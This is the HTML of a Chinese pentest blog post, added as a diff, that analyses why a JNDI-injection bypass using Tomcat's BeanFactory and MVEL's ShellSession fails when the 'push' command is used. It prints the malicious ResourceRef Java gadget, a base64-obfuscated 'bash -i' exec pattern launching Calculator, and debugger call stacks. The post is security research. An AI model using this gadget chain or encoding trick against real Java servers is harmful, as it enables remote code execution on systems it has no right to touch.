@@ -1,0 +1,339 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>JNDI Bypass - MVEL | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="测试背景JDNI利用mvel绕过高版本java限制的时候，使用runtime exec编码变形之后执行命令失败。只能弹个计算器。
+测试结果浅蓝师傅在探索高版本JDK下JNDI 漏洞的利用方法中给出的执行方式:
+private static ResourceRef tomcat_MVEL()&amp;#123;
+    ResourceRef ref = new ResourceRef(&#34;org.mvel2.sh.ShellSession&#34;, null, &#34;&#34;, &#34;&#34;,
+            true, &#34;org.apache.naming.factory.BeanFactory&#34;, null);
+    ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;a=exec&#34;));
+    ref.add(new StringRefAddr(&#34;a&#34;,
+            &#34;push Runtime.getRuntime().exec(&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&#34;));
+    return ref;
+&amp;#125;
+先说结论：把执行命令的时候push指令去掉，可以成功执行命令。
+原因探索先把测试的命令做一次编码:open /System/Applications/Calculator.app/Contents/MacOS/Calculator经过编码之后： bash -c &amp;#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;
+存在push的时候经过一路的跳转，进入到_exec()函数，调用堆栈如下:"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="JNDI Bypass - MVEL"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> JNDI Bypass - MVEL</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="测试背景"><a href="#测试背景" class="headerlink" title="测试背景"></a>测试背景</h2><p>JDNI利用mvel绕过高版本java限制的时候，使用<a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">runtime exec</a>编码变形之后执行命令失败。只能弹个计算器。<br><img src="/2022/03/21/jndi-exec-by-mvel/1.png"></p>
+<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>浅蓝师傅在<a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI 漏洞的利用方法</a>中给出的执行方式:</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>
+            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>
+            <span class="token string">"push Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> ref<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>先说结论：把执行命令的时候<code>push</code>指令去掉，可以成功执行命令。</p>
+<h2 id="原因探索"><a href="#原因探索" class="headerlink" title="原因探索"></a>原因探索</h2><p>先把测试的命令做一次编码:<code>open /System/Applications/Calculator.app/Contents/MacOS/Calculator</code><br>经过编码之后： <code>bash -c &#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
+<h3 id="存在push的时候"><a href="#存在push的时候" class="headerlink" title="存在push的时候"></a>存在push的时候</h3><p>经过一路的跳转，进入到<code>_exec()</code>函数，调用堆栈如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">_exec:122, ShellSession (org.mvel2.sh)
+exec:463, ShellSession (org.mvel2.sh)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:498, Method (java.lang.reflect)
+getObjectInstance:211, BeanFactory (org.apache.naming.factory)
+getObjectInstance:321, NamingManager (javax.naming.spi)
+decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
+lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
+lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
+lookup:417, InitialContext (javax.naming)
+main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>函数在108行对传入的字符串进行分割: <code>String[] inTokens = this.inBuffer.append(this.commandBuffer).toString().split(&quot;\\s&quot;);</code>， <code>\s</code>表示空格、tab、换行: <code>&#39; &#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;</code>等<br><img src="/2022/03/21/jndi-exec-by-mvel/2.png"><br>分割之后，得到<code>inTokens</code>:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">inTokens <span class="token operator">=</span> <span class="token punctuation">&#123;</span>String<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>@1355<span class="token punctuation">&#125;</span> 
+ <span class="token number">0</span> <span class="token operator">=</span> <span class="token string">"push"</span>
+ <span class="token number">1</span> <span class="token operator">=</span> <span class="token string">"Runtime.getRuntime().exec('bash"</span>
+ <span class="token number">2</span> <span class="token operator">=</span> <span class="token string">"-c"</span>
+ <span class="token number">3</span> <span class="token operator">=</span> <span class="token string">"&#123;echo,L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后获取<code>inTokens[1:]</code>赋值给<code>passParamters</code>。继续跟进到119行代码: <code>((Command)this.commands.get(inTokens[0])).execute(this, passParameters);</code>，进入调用push指令的函数，此时的参数如下：<br><img src="/2022/03/21/jndi-exec-by-mvel/3.png"><br>在<code>pushContext.java</code>里面调用<code>MVEL.eval</code>解析MVEL表达式，这个时候可以看出来执行<code>MVEL.eval</code>的时候，第一个参数是args[0]: <code>Runtime.getRuntime().exec(&#39;bash</code>，所以会导致命令执行失败:<br><img src="/2022/03/21/jndi-exec-by-mvel/4.png"></p>
+<h3 id="去掉push的时候"><a href="#去掉push的时候" class="headerlink" title="去掉push的时候"></a>去掉push的时候</h3><p>当没有push的时候，执行到<code>SHellSession.java</code>会跳转到123行代码分支，然后实例化<code>MVELInterpretedRuntime</code>之后调用<code>parse()</code>函数:<br><img src="/2022/03/21/jndi-exec-by-mvel/5.png"><br>经过一系列解析判断之后最终进入到<code>propertyAccessor.class</code>的896行，获取到<code>Runtime</code>上下文之后调用传入的参数:<br><img src="/2022/03/21/jndi-exec-by-mvel/6.png"><br>函数调用堆栈:</p>
+<pre class="line-numbers language-none"><code class="language-none">getMethod:995, PropertyAccessor (org.mvel2)
+getNormal:181, PropertyAccessor (org.mvel2)
+get:145, PropertyAccessor (org.mvel2)
+get:125, PropertyAccessor (org.mvel2)
+getReducedValue:187, ASTNode (org.mvel2.ast)
+parseAndExecuteInterpreted:112, MVELInterpretedRuntime (org.mvel2)
+parse:58, MVELInterpretedRuntime (org.mvel2)
+_exec:171, ShellSession (org.mvel2.sh)
+exec:463, ShellSession (org.mvel2.sh)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:498, Method (java.lang.reflect)
+getObjectInstance:211, BeanFactory (org.apache.naming.factory)
+getObjectInstance:321, NamingManager (javax.naming.spi)
+decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
+lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
+lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
+lookup:417, InitialContext (javax.naming)
+main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI漏洞的利用方法</a></li>
+<li><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">RUNTIME.EXEC PAYLOAD ENCODE</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/JKme/EvilRMI">EvilRMI</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2022/03/21/jndi-exec-by-mvel.html" class="leancloud-visitors view" data-flag-title="JNDI Bypass - MVEL">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2022/03/18/from-spring-boot-to-getshell.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-03-21 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>44</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B5%8B%E8%AF%95%E8%83%8C%E6%99%AF"><span class="toc-article-text">测试背景</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C"><span class="toc-article-text">测试结果</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8E%9F%E5%9B%A0%E6%8E%A2%E7%B4%A2"><span class="toc-article-text">原因探索</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AD%98%E5%9C%A8push%E7%9A%84%E6%97%B6%E5%80%99"><span class="toc-article-text">存在push的时候</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8E%BB%E6%8E%89push%E7%9A%84%E6%97%B6%E5%80%99"><span class="toc-article-text">去掉push的时候</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-article-text">参考链接</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
